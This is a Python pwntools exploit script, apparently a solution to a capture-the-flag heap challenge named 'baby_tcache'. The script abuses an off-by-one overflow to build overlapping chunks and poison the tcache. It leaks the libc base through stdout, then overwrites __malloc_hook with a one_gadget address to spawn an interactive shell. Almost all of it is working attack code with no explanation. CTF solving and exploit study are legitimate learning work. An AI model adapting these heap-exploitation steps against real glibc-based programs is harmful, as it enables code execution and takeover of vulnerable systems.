#!/usr/bin/env python
from pwn import *

p=process(argv=['./baby_tcache'],env={'LD_PRELOAD':'./libc.so.6'})#,aslr=False)
context(arch='amd64',log_level='debug',os='linux')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def new(size,content,sline=1):
    ru(': ')
    sl('1')
    ru(':')
    sl(str(size))
    ru(':')
    if sline:
        sl(content)
    else:
        sd(content)

def delete(index):
    ru(': ')
    sl('2')
    ru(':')
    sl(str(index))


new(0x4f0,'123')                     
new(0x70,'123')                      
new(0x4f0,'123')
new(0x70,'123')
delete(3)                    
new(0x20,'123')                      # 3


delete(0)            # unsorted bin
delete(1)            # tcache

new(0x78,'a'*0x70+p64(0x580),0)        

delete(2)
delete(0)                                # tcache

new(0x4f0,'123')                       
delete(0) 
payload='a'*0x4f0
payload+=p64(0)+p64(0x81)
payload+='\x88\x77'

new(0xa70,payload,0)                # 0
new(0x70,'123')                     # 1
new(0x70,'\xf8\xff',0)                # 2 stdin

line=p.recvuntil('$$$$$$$$$$$$$$$$$$$$$$$$$$$')
libc=u64(line[5+3*8:5+4*8])-0x3eb8c0

one_off=0x4f2c5
one_off=0x4f322
one_off=0x10a38c
malloc_hook=libc+0x3ebc30
one=libc+one_off               


delete(1)                     # tcache
delete(0)                     # unsortedbin

# gdb.attach(p)
payload='a'*0x4f0
payload+=p64(0)+p64(0x80)
payload+=p64(malloc_hook)
print(hex(malloc_hook))
new(0xa70,payload)
new(0x70,p64(one),0)
new(0x70,p64(one),0)

ru(': ')
sl('1')
ru(':')
sl('123')
p.interactive()